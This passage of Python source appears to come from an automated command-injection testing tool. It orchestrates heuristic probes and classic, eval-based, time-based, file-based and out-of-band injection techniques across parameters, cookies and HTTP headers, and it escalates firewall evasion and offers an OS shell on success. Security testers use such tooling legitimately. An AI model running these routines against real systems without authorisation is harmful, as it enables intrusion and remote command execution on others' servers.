      if not settings.LOAD_SESSION:
        settings.LOAD_SESSION = None
      basic_level_checks()

    inject_http_headers = check_parameter_in_http_header(check_parameter, place)

    if inject_http_headers:
      checks.define_vulnerable_http_header(check_parameter)

    # User-Agent/Referer/Host/Custom HTTP header Injection(s)
    if any((settings.USER_AGENT_INJECTION, settings.REFERER_INJECTION, settings.HOST_INJECTION, settings.CUSTOM_HEADER_INJECTION)):
      header_name = ""
      the_type = "HTTP Header"
      inject_parameter = " parameter '" + check_parameter + "'"
    else:
      if settings.COOKIE_INJECTION:
        header_name = settings.COOKIE
      else:
        header_name = ""
      the_type = " parameter"
      inject_parameter = " '" + check_parameter + "'"

    # Nothing left to probe when all required time-related techniques were resumed.
    time_techniques_resumed = False
    if checks.technique_selected("t") or checks.technique_selected("f"):
      needed_time_techniques = set()
      if checks.technique_selected("t"):
        needed_time_techniques.add(settings.INJECTION_TECHNIQUE.TIME_BASED)
      if checks.technique_selected("f"):
        needed_time_techniques.add(settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED)
      time_techniques_resumed = settings.LOAD_SESSION and needed_time_techniques.issubset(settings.STORED_TECHNIQUES.keys())

    # Defer response-time estimation until a time-related technique is about to run.
    url_time_response = 0
    _time_warmup_done = False
    # Take the timing model once, before the first technique that needs one.
    def _ensure_time_warmup():
      nonlocal timesec, url_time_response, _time_warmup_done
      if _time_warmup_done or settings.SKIP_COMMAND_INJECTIONS:
        return
      _time_warmup_done = True
      if time_techniques_resumed:
        url_time_response = 0
      else:
        timesec, url_time_response = requests.estimate_response_time(url, timesec, http_request_method)

    # Load modules
    modules_handler.load_modules(url, http_request_method, filename)

    settings.CHECKING_PARAMETER = ""
    if not header_name == settings.COOKIE and not the_type == "HTTP Header":
      settings.CHECKING_PARAMETER = checks.check_http_method(url)
      settings.CHECKING_PARAMETER += ('', ' JSON')[settings.IS_JSON] + ('', ' SOAP/XML')[settings.IS_XML]
    if header_name == settings.COOKIE :
       settings.CHECKING_PARAMETER += str(header_name) + str(the_type) + str(inject_parameter)
    elif the_type == "HTTP Header":
       settings.CHECKING_PARAMETER += check_parameter.title() + " HTTP Header"
    else:
       settings.CHECKING_PARAMETER += str(the_type) + str(header_name) + str(inject_parameter)

    if check_parameter in settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST and not checks.already_tested(place, check_parameter):
      settings.CHECKING_PARAMETER = "(custom) " + settings.CHECKING_PARAMETER

    if not settings.LOAD_SESSION:
      info_msg = "Setting " + settings.CHECKING_PARAMETER  + " for tests."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      
    if menu.options.skip_heuristics:
      if settings.VERBOSITY_LEVEL != 0:
        debug_msg = "Skipping heuristic (basic) test on the " + settings.CHECKING_PARAMETER + "."
        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    else:
      if not settings.LOAD_SESSION:
        checks.recognise_payload(payload=settings.TESTABLE_VALUE)
        info_msg = "Performing heuristic (basic) test on the " + settings.CHECKING_PARAMETER + "."
        settings.print_data_to_stdout(settings.print_info_msg(info_msg))

        try:
          if not (len(menu.options.tech) == 1 and "e" in menu.options.tech):
            url = command_injection_heuristic_basic(url, http_request_method, check_parameter, place)

          # Asked for out-of-band, so probe the channel either way: whether the target can reach it
          # at all, and over which client, is a separate question from whether it is injectable.
          if menu.options.oob:
            url = oob_heuristic_basic(url, http_request_method, check_parameter, place)

          # What this looks for is the sink, not a technique, so which technique will carry it has no
          # bearing on whether it is worth looking - and where the switch was not given at all, this
          # is what offers it.
          if not settings.IDENTIFIED_COMMAND_INJECTION:
            # Check for identified warnings
            url = code_injections_heuristic_basic(url, http_request_method, check_parameter, place)
        except KeyboardInterrupt:
          try:
            checks.handle_detection_interrupt(filename, url)
          except (settings.SkipTechniqueException, settings.RetryTechniqueException):
            # No technique is running yet at this stage - just skip past heuristics.
            pass
          except settings.EndDetectionPhaseException:
            break

        # Asked last and only where nothing else could answer, "no" still being a fair answer.
        if settings.OS_IDENTIFICATION_PENDING:
          settings.OS_IDENTIFICATION_PENDING = False
          warn_msg = "Unable to fingerprint the target operating system."
          settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
          checks.define_target_os()

        if not settings.IDENTIFIED_COMMAND_INJECTION and not settings.IDENTIFIED_WARNINGS and not settings.IDENTIFIED_EVAL_PROBE:
          settings.HEURISTIC_TEST.POSITIVE = False
          warn_msg = "Heuristic (basic) test shows that "
          warn_msg += settings.CHECKING_PARAMETER + " might not be injectable."
          settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))

    if (menu.options.smart and not settings.HEURISTIC_TEST.POSITIVE) or (menu.options.smart and menu.options.skip_heuristics):
      info_msg = "Skipping "
      info_msg += settings.CHECKING_PARAMETER + "."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      settings.HEURISTIC_TEST.POSITIVE = True
    else:
      if menu.options.failed_tries and \
         menu.options.tech and not "f" in menu.options.tech:
        warn_msg = "Due to the provided (unsuitable) injection technique"
        warn_msg += "s"[len(menu.options.tech) == 1:][::-1] + ", "
        warn_msg += "ignoring the option '--failed-tries'."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

      # Procced with file-based semiblind command injection technique,
      # once the user provides the path of web server's root directory.
      if menu.options.web_root and settings.USER_APPLIED_TECHNIQUE and not "f" in menu.options.tech:
        menu.options.web_root = checks.normalize_target_dir(menu.options.web_root)
        if checks.procced_with_file_based_technique():
          menu.options.tech = "f"

      # Whether a stored finding already answers what this technique would ask.
      def _time_related_resume_redundant():
        # A resumed finding is already confirmed, so re-verifying the slow ones adds nothing
        # when a results-based technique is stored too.
        return settings.LOAD_SESSION and not settings.USER_APPLIED_TECHNIQUE and any(
          _ in settings.STORED_TECHNIQUES for _ in (settings.INJECTION_TECHNIQUE.CLASSIC, settings.INJECTION_TECHNIQUE.DYNAMIC_CODE))

      # Test the parameter by how long the target takes to answer.
      def _run_time_based():
        if _time_related_resume_redundant():
          return
        if checks.technique_selected("t", eval_sink=bool(menu.options.eval_sink)):
          _ensure_time_warmup()
          # A resumed finding is re-verified against its own full delay, so the model can wait
          # until the first command actually needs it.
          if not (settings.LOAD_SESSION and settings.INJECTION_TECHNIQUE.TIME_BASED in settings.STORED_TECHNIQUES):
            checks.warm_up_response_baseline(url, http_request_method)
        return timebased_technique(url, timesec, filename, http_request_method, url_time_response)

      # Test the parameter by a file the target writes and then serves back.
      def _run_file_based():
        if _time_related_resume_redundant():
          return
        if len(menu.options.tech) == 0 or "f" in menu.options.tech:
          _ensure_time_warmup()
        return filebased_command_injection_technique(url, timesec, filename, http_request_method, url_time_response)

      end_detection = False
      techniques = [
        lambda: classic_command_injection_technique(url, timesec, filename, http_request_method),
        lambda: dynamic_code_evaluation_technique(url, timesec, filename, http_request_method),
        _run_time_based,
        _run_file_based,
        lambda: oob_command_injection_technique(url, timesec, filename, http_request_method),
      ]
      # Work through the techniques in turn, carrying on past the ones that find nothing.
      def _run_techniques():
        technique_idx = 0
        while technique_idx < len(techniques):
          try:
            techniques[technique_idx]()
            # The evasion was stepped up while this ran, so the technique never got a fair try.
            if settings.WAF_EVASION_ESCALATED:
              settings.WAF_EVASION_ESCALATED = False
              continue
            technique_idx += 1
          except settings.SkipTechniqueException:
            technique_idx += 1
          except settings.RetryTechniqueException:
            pass
          except settings.EndDetectionPhaseException:
            return True
        return False

      end_detection = _run_techniques()
      # Nothing got through while a protection is in the way, so reach for a heavier evasion and
      # give the techniques another go - being blocked throughout is the answer this waits for.
      while not end_detection and checks.injection_techniques_status() == False and \
            settings.WAF_ENABLED and checks.escalate_waf_evasion(on_block=False):
        settings.WAF_EVASION_ESCALATED = False
        end_detection = _run_techniques()

      # All injection techniques seems to be failed!
      if checks.injection_techniques_status() == False:
        warn_msg = settings.CHECKING_PARAMETER
        warn_msg += " does not seem to be injectable."
        settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
      else:
        if settings.LOAD_SESSION:
          if settings.STORED_TECHNIQUES:
            rows = [(row[1], row[2], row[5], row[10], "HTTP Header" if row[11] else row[12]) for row in settings.STORED_TECHNIQUES.values()]
            checks.resumed_injection_points_summary(rows)
          checks.suggest_os_shell()
          checks.quit(filename, url, hard_exit=False)
        elif settings.CONFIRMED_INJECTION_POINTS and not settings.ASKED_KEEP_TESTING:
          settings.ASKED_KEEP_TESTING = True
          if checks.prompt_keep_testing(url):
            checks.quit(filename, url, hard_exit=False)

    if not settings.CHECK_BOTH_OS or end_detection:
      break

"""
Whether this parameter already has a stored session - used to test known-vulnerable ones first.
"""
def has_stored_session(url, check_parameter, http_request_method):
  if menu.options.ignore_session or menu.options.flush_session or not os.path.isfile(settings.SESSION_FILE):
    return False
  try:
    return bool(session_handler.load_stored_techniques(url, check_parameter, http_request_method))
  except Exception:
    return False

"""
Perform injection for a specific HTTP header (User-Agent, Referer, or Host)
"""
def http_headers_injection(url, http_request_method, filename, timesec):

  # Test one HTTP header as the parameter, then put back what it held.
  def inject_header(header_attr, option_attr, injection_flag_attr):
    # Save the original value of the option (to restore later)
    original_value = getattr(menu.options, option_attr)

    # Enable the corresponding injection flag
    setattr(settings, injection_flag_attr, True)

    # Get the header name (e.g. "user-agent", "referer", "host")
    header_name = getattr(settings, header_attr).lower()
    settings.HTTP_HEADER = check_parameter = header_name

    # Check if the session has stored data for this header
    new_url, check_parameter = check_for_stored_sessions(url, check_parameter, http_request_method)

    # If the header was replaced or injection failed, reset the injection flag
    reset_flag = check_parameter != header_name
    if not reset_flag:
      try:
        reset_flag = not injection_process(new_url, check_parameter, http_request_method, filename, timesec, getattr(settings, header_attr))
      except settings.NextParameterException:
        reset_flag = True
    if reset_flag:
      setattr(settings, injection_flag_attr, None)

    # Restore the original option value
    setattr(menu.options, option_attr, original_value)

  # If no specific test or skip parameters and no injection flags are set, test all headers
  no_injection_flags = not settings.USER_AGENT_INJECTION and not settings.REFERER_INJECTION and not settings.HOST_INJECTION
  no_test_or_skip = menu.options.test_parameter is None and menu.options.skip_parameter is None

  # Determine whether a header should be tested for injection
  def test_header(header_attr):
    # Check if the corresponding injection flag is already active
    if getattr(settings, header_attr.upper() + "_INJECTION"):
      return True

    # A marker naming one header asks for that header - the others are reached only when nothing
    # named a specific one, or the rest would be tested off the back of a request for this one.
    if not no_injection_flags:
      return False

    # Named as it is written: 'ua', 'useragent' and 'user-agent' all ask for the same header.
    if settings.TESTABLE_PARAMETERS_LIST:
      return checks.header_named(getattr(settings, header_attr), settings.TESTABLE_PARAMETERS_LIST)
    if settings.SKIP_PARAMETERS_LIST:
      return not checks.header_named(getattr(settings, header_attr), settings.SKIP_PARAMETERS_LIST)
    return True

  # Test already-confirmed headers first, not in fixed order.
  headers = ["USER_AGENT", "REFERER", "HOST"]
  headers.sort(key=lambda header_attr: not has_stored_session(url, getattr(settings, header_attr).lower(), http_request_method))
  header_args = {
    "USER_AGENT": ("agent", "USER_AGENT_INJECTION"),
    "REFERER": ("referer", "REFERER_INJECTION"),
    "HOST": ("host", "HOST_INJECTION"),
  }

  if no_injection_flags and no_test_or_skip:
    for header_attr in headers:
      inject_header(header_attr, *header_args[header_attr])
  else:
    # Conditional injection based on test/skip flags or predefined injection settings
    for header_attr in headers:
      if test_header(header_attr):
        inject_header(header_attr, *header_args[header_attr])

"""
Inject Cookie parameters
"""
def cookie_injection(url, http_request_method, filename, timesec):
  if not menu.options.cookie:
    check_parameter = settings.COOKIE.lower()
    check_for_stored_sessions(url, check_parameter, http_request_method)

  cookie = menu.options.cookie
  if cookie:
    settings.COOKIE_INJECTION = True
    # Cookie Injection
    header_name = settings.SINGLE_WHITESPACE + settings.COOKIE
    settings.HTTP_HEADER = header_name[1:].lower()
    cookie_parameters = parameters.do_cookie_check(menu.options.cookie)
    if type(cookie_parameters) is str:
      cookie_parameters_list = []
      cookie_parameters_list.append(cookie_parameters)
      cookie_parameters = cookie_parameters_list
    do_injection(cookie_parameters, settings.COOKIE, url, http_request_method, filename, timesec)

  if settings.COOKIE_INJECTION:
    # Restore cookie value
    menu.options.cookie = cookie
    # Disable cookie injection
    settings.COOKIE_INJECTION = False

"""
Remove parameters containing the injection tag from the testable parameters list.
"""
def filtered_testable_parameters():
  settings.TESTABLE_PARAMETERS_LIST = [
  param for param in settings.TESTABLE_PARAMETERS_LIST
  if settings.INJECT_TAG not in param]
  return settings.TESTABLE_PARAMETERS_LIST

"""
Process a list of parameters to test for injection vulnerabilities.
"""
def do_injection(found, data_type, url, http_request_method, filename, timesec):

  """
  Validate parameter names using allowed characters:
  letters, digits, underscores, hyphens, dots, and square brackets.
  """
  def is_valid_param_name(name):
    if not isinstance(name, str):
      return False
    name = name.strip()
    if not name:
      return False
    return bool(re.match(r'^[\w._\-\[\]]+$', name, re.UNICODE))

  """
  Define the check parameter based on the data type (POST, GET, COOKIE).
  """
  def define_check_parameter(param, current_url):
    if data_type == settings.HTTPMETHOD.POST:
      menu.options.data = param
      check_param = parameters.vuln_POST_param(param, current_url)
    elif data_type == settings.HTTPMETHOD.GET:
      current_url = param
      check_param = parameters.vuln_GET_param(current_url)
    elif data_type == settings.COOKIE:
      menu.options.cookie = param
      check_param = parameters.specify_cookie_parameter(param)
    else:
      check_param = ""
    return current_url, check_param

  """
  Return a unique identifier for the parameter by prefixing it with the data type.
  """
  def get_contextual_name(check_param):
    return checks.tested_parameter_name(data_type, check_param)

  """
  Perform the injection call and update tested parameters.
  """
  def injection_call(url, check_param):
    contextual_name = get_contextual_name(check_param)
    url, check_param = define_check_parameter(found[index], url)
    url, check_param = check_for_stored_sessions(url, check_param, http_request_method)
    # Dispatched as a GET, POST or Cookie parameter, and tested as one whatever it is named.
    injection_process(url, check_param, http_request_method, filename, timesec, data_type)
    settings.TESTED_PARAMETERS_LIST.append(contextual_name)

  check_parameters = []
  param_mapping = {}

  # Filter and validate parameters to prepare for injection tests
  for param in found:
    url, check_param = define_check_parameter(param, url)
    if not check_param:
      continue
    contextual_name = get_contextual_name(check_param)
    if contextual_name in settings.TESTED_PARAMETERS_LIST:
      continue
    if not is_valid_param_name(check_param):
      continue
    check_parameters.append(check_param)
    param_mapping[check_param] = param

  # Prepare testable parameters
  filtered_testable_parameters()
  checks.testable_parameters(url, check_parameters)

  # Custom marker parameters are always targeted, regardless of -p/--skip.
  custom_params = set(settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST) \
    if settings.CUSTOM_INJECTION_MARKER else set()

  # Test already-confirmed parameters first, not in request order.
  if not menu.options.ignore_session and not menu.options.flush_session and os.path.isfile(settings.SESSION_FILE):
    # Whether this parameter already has a finding stored from an earlier run.
    def has_stored_session(check_param):
      try:
        return bool(session_handler.load_stored_techniques(url, check_param, http_request_method))
      except Exception:
        return False
    check_parameters.sort(key=lambda param: not has_stored_session(param))

  for check_param in check_parameters:
    contextual_name = get_contextual_name(check_param)
    if contextual_name in settings.TESTED_PARAMETERS_LIST:
      continue

    try:
      original_param = param_mapping[check_param]
      index = found.index(original_param)
    except (KeyError, ValueError):
      continue

    if check_param in custom_params or checks.is_parameter_testable(check_param):
      try:
        injection_call(url, check_param)
      except settings.NextParameterException:
        continue

"""
Check if HTTP Method is GET.
"""
def get_request(url, http_request_method, filename, timesec):
  found_url = parameters.do_GET_check(url, http_request_method)

  if found_url != False:
    do_injection(found_url, settings.HTTPMETHOD.GET, url, http_request_method, filename, timesec)

"""
Check if HTTP Method is POST.
"""
def post_request(url, http_request_method, filename, timesec):

  parameter = settings.USER_DEFINED_POST_DATA
  found_parameter = parameters.do_POST_check(parameter, http_request_method)

  if type(found_parameter) is str:
    found_parameter_list = []
    found_parameter_list.append(found_parameter)
    found_parameter = found_parameter_list

  if any((settings.IS_JSON, settings.IS_XML)):
    # Remove junk data
    found_parameter = [x for x in found_parameter if settings.INJECT_TAG in x]
  else:
    # Remove whitespaces
    found_parameter = [x.replace(settings.SINGLE_WHITESPACE, "") for x in found_parameter]

  do_injection(found_parameter, settings.HTTPMETHOD.POST, url, http_request_method, filename, timesec)

"""
Perform GET / POST parameters checks
"""
def data_checks(url, http_request_method, filename, timesec):
  settings.CUSTOM_HEADER_INJECTION = False

  init_cookie_injection_status()
  if settings.USER_DEFINED_POST_DATA and not settings.IGNORE_USER_DEFINED_POST_DATA:
    if post_request(url, http_request_method, filename, timesec) is None:
      if not settings.SKIP_NON_CUSTOM_PARAMS:
        get_request(url, http_request_method, filename, timesec)
  else:
    if get_request(url, http_request_method, filename, timesec) is None:
      if settings.USER_DEFINED_POST_DATA:
        if not settings.SKIP_NON_CUSTOM_PARAMS:
          post_request(url, http_request_method, filename, timesec) 

"""
Perform checks over cookie values.
"""
def cookies_checks(url, http_request_method, filename, timesec): 
  if len([i for i in settings.TESTABLE_PARAMETERS_LIST if i in str(menu.options.cookie)]) != 0 or \
    settings.INJECTION_MARKER_LOCATION.COOKIE or \
    settings.COOKIE_INJECTION:
    if not settings.SKIP_NON_CUSTOM_PARAMS:
      cookie_injection(url, http_request_method, filename, timesec)

"""
Perform checks over HTTP Headers parameters.
"""
def headers_checks(url, http_request_method, filename, timesec):
  if checks.any_header_named(settings.TESTABLE_PARAMETERS_LIST) or \
    settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS or \
    settings.HTTP_HEADERS_INJECTION:
    if not settings.SKIP_NON_CUSTOM_PARAMS:
      http_headers_injection(url, http_request_method, filename, timesec)

"""
Perform checks over custom HTTP Headers parameters.
"""
def custom_headers_checks(url, http_request_method, filename, timesec): 
  for name in range(len(settings.CUSTOM_HEADERS_NAMES)):
    if settings.ASTERISK_MARKER in settings.CUSTOM_HEADERS_NAMES[name].split(": ")[1] and not settings.CUSTOM_INJECTION_MARKER:
      settings.CUSTOM_HEADER_INJECTION = False
    else:
      settings.CUSTOM_HEADER_INJECTION = True
      settings.CUSTOM_HEADER_NAME = settings.CUSTOM_HEADERS_NAMES[name].split(": ")[0]
      settings.HTTP_HEADER = check_parameter = header_name = settings.CUSTOM_HEADER_NAME.lower()
      settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST.append(check_parameter) if check_parameter not in settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST else settings.CUSTOM_INJECTION_MARKER_PARAMETERS_LIST
      settings.CUSTOM_HEADER_VALUE = settings.CUSTOM_HEADERS_NAMES[name].split(": ")[1].replace(settings.ASTERISK_MARKER, settings.INJECT_TAG)
      url, check_parameter = check_for_stored_sessions(url, check_parameter, http_request_method)
      try:
        if check_parameter != header_name or not injection_process(url, check_parameter, http_request_method, filename, timesec, settings.CUSTOM_HEADER_PLACE):
          settings.CUSTOM_HEADER_INJECTION = False
      except settings.NextParameterException:
        settings.CUSTOM_HEADER_INJECTION = False
      settings.CUSTOM_HEADERS_NAMES[name] = checks.remove_tags(settings.CUSTOM_HEADERS_NAMES[name])
  settings.CUSTOM_HEADER_INJECTION = False

"""
Perform checks across multiple HTTP components (URL parameters, POST data, cookies,
standard headers, and custom headers) to identify possible injection points.
"""
def perform_checks(url, http_request_method, filename):

  # Prepare whitespaces if multiple targets or stdin parsing is used,
  # and more than one whitespace character is defined. Keep only one.
  if (settings.MULTI_TARGETS or settings.STDIN_PARSING) and \
     len(settings.WHITESPACES) > 1:
    settings.WHITESPACES = [_urllib.parse.quote(settings.SINGLE_WHITESPACE)]

  timesec = settings.TIMESEC

  # Handle authentication if both the authentication URL and the authentication data are provided.
  if menu.options.auth_url and menu.options.auth_data:
    authentication.authentication_process(http_request_method)
    try:
      response = _urllib.request.urlopen(url, timeout=settings.TIMEOUT)
      try:
        main_content = response.read()
      finally:
        response.close()

      response = _urllib.request.urlopen(menu.options.auth_url, timeout=settings.TIMEOUT)
      try:
        auth_content = response.read()
      finally:
        response.close()

      # Verify authentication success by comparing the response content of the main URL and the auth URL.
      if main_content == auth_content:
        err_msg = "Authentication failed using the specified credentials and URL."
        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
        raise SystemExit()

    except (_urllib.error.URLError, _urllib.error.HTTPError) as err_msg:
      # Authentication request failed due to a connection or HTTP error.
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()

  # If only one of the required authentication options is provided, display an error and exit.
  elif menu.options.auth_url or menu.options.auth_data:
    err_msg = "Authentication requires specifying both '--auth-url' and '--auth-data' options."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

  # If shellshock testing is enabled, force the injection level to HTTP header level.
  if menu.options.shellshock:
    settings.INJECTION_LEVEL = settings.HTTP_HEADER_INJECTION_LEVEL
  else:
    # If the user specified a custom injection level and no custom marker is used,
    # set the level to the user-defined value.
    if settings.INJECTION_LEVEL != settings.DEFAULT_INJECTION_LEVEL and \
       not settings.CUSTOM_INJECTION_MARKER:
      settings.INJECTION_LEVEL = settings.USER_APPLIED_LEVEL

  proceed_non_custom = True
  
  # Perform custom marker-based checks if custom injection marker is enabled.
  if settings.CUSTOM_INJECTION_MARKER:
    proceed_non_custom = False

    # Perform checks over GET and POST parameters.
    if settings.INJECTION_MARKER_LOCATION.URL or \
       settings.INJECTION_MARKER_LOCATION.DATA:
      data_checks(url, http_request_method, filename, timesec)

    # Perform checks over cookie values.
    if settings.INJECTION_MARKER_LOCATION.COOKIE:
      cookies_checks(url, http_request_method, filename, timesec)

    # Perform checks over standard HTTP headers (User-Agent, Referer, Host).
    if settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS:
      headers_checks(url, http_request_method, filename, timesec)

    # Perform checks over custom user-defined HTTP headers.
    if settings.INJECTION_MARKER_LOCATION.CUSTOM_HTTP_HEADERS:
      custom_headers_checks(url, http_request_method, filename, timesec)

    # Check if the injection marker is set in either URL or POST data (but not both)
    has_exclusive_marker = settings.INJECTION_MARKER_LOCATION.URL ^ settings.INJECTION_MARKER_LOCATION.DATA
    # Check if no injection marker is set in either URL or POST data
    has_no_marker = not settings.INJECTION_MARKER_LOCATION.URL and not settings.INJECTION_MARKER_LOCATION.DATA
    # If there’s user POST data and an exclusive marker, or no marker at all,
    # and no testable GET parameters, proceed with non-custom checks
    if has_exclusive_marker or has_no_marker:
      checks.process_non_custom()

  # Perform default (non-custom) injection checks if not explicitly skipped.
  if not settings.SKIP_NON_CUSTOM_PARAMS:
    # Disable custom injection mode before running default checks.
    settings.CUSTOM_INJECTION_MARKER = False

    # Perform checks over GET/POST parameters if allowed or marker is not set in URL/DATA.
    if settings.TESTABLE_PARAMETERS_LIST or \
       not settings.INJECTION_MARKER_LOCATION.URL or \
       not settings.INJECTION_MARKER_LOCATION.DATA:
      data_checks(url, http_request_method, filename, timesec)

    if proceed_non_custom:
      # Determine if we should perform cookie-based injection checks.
      cookie_check = (settings.TESTABLE_PARAMETERS_LIST or \
                      not settings.INJECTION_MARKER_LOCATION.COOKIE) and \
                      settings.INJECTION_LEVEL >= settings.COOKIE_INJECTION_LEVEL
      if cookie_check:
        settings.COOKIE_INJECTION = True
        cookies_checks(url, http_request_method, filename, timesec)

      # Whether a standard header was asked for by name, under any of the names it answers to.
      header_found = checks.any_header_named(settings.TESTABLE_PARAMETERS_LIST)

      # Decide if header-based injection should be tested.
      header_check = (settings.TESTABLE_PARAMETERS_LIST or \
                      not settings.INJECTION_MARKER_LOCATION.HTTP_HEADERS) and \
                      settings.INJECTION_LEVEL == settings.HTTP_HEADER_INJECTION_LEVEL or header_found

      if header_check:
        # Perform custom headers injection checks.
        settings.CUSTOM_HEADER_INJECTION = True
        custom_headers_checks(url, http_request_method, filename, timesec)

        settings.HTTP_HEADERS_INJECTION = True
        headers_checks(url, http_request_method, filename, timesec)

  # Return True if injection checks are active/enabled, False otherwise.
  return settings.INJECTION_CHECKER is not False


"""
General check on every injection technique.
"""
def do_check(url, http_request_method, filename):
  try:
    if settings.RECHECK_FILE_FOR_EXTRACTION:
      settings.RECHECK_FILE_FOR_EXTRACTION = False

    # Check for '--tor' switch.
    if menu.options.tor:
      if checks.technique_selected("t") or checks.technique_selected("f"):
        warn_msg = "It is highly recommended to avoid usage of switch '--tor' for "
        warn_msg += "time-based injections because of inherent high latency time."
        settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

    # Check target URL for CGI scripts vulnerable to Shellshock.
    checks.check_CGI_scripts(url)
    # Modules don't need a normal testable parameter to run.
    modules_handler.load_modules(url, http_request_method, filename)
    perform_checks(url, http_request_method, filename)
      
    # All injection techniques seems to be failed!
    if not settings.INJECTION_CHECKER and not settings.LOAD_SESSION:
      if settings.NOT_TESTABLE_PARAMETERS:
        err_msg = "All testable parameters you provided are not present within the given request data."
      else:
        err_msg = "All tested parameters do not appear to be injectable."
        if settings.INJECTION_LEVEL < settings.HTTP_HEADER_INJECTION_LEVEL :
          err_msg += " Try to increase value for '--level' option"
          err_msg += " if you wish to perform more tests."
        if settings.USER_APPLIED_TECHNIQUE or settings.SKIP_TECHNIQUES:
          err_msg += " You can try to re-run without providing the option "
          if not settings.SKIP_TECHNIQUES :
            err_msg += "'--technique'."
          else:
            err_msg += "'--skip-technique'."
          untested = checks.untested_techniques()
          if untested:
            err_msg += " That would also test the " + untested + "."
        if not menu.options.eval_sink:
          err_msg += " Code injection was not tested; the '--eval' option tests for it."
        err_msg += " If you suspect that there is some kind of protection mechanism involved, maybe you could try to"
        if not menu.options.tamper:
          err_msg += " use option '--tamper'"
        if not menu.options.random_agent:
          if not menu.options.tamper:
            err_msg += " and/or"
          err_msg += " switch '--random-agent'"
        err_msg += "."
        if settings.MULTI_TARGETS:
          err_msg += " Skipping to the next target."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      if not settings.MULTI_TARGETS:
        common.show_http_error_codes()
        raise SystemExit()
    elif settings.MULTI_TARGETS:
      checks.finish_target()
      logs.print_logs_notification(filename, url)
    else:
      # Summary, deferred actions, os-shell entry, log notice and exit all happen in quit().
      checks.quit(filename, url, hard_exit=False)

  except KeyboardInterrupt:
    checks.handle_early_interrupt(filename, url)

# eof
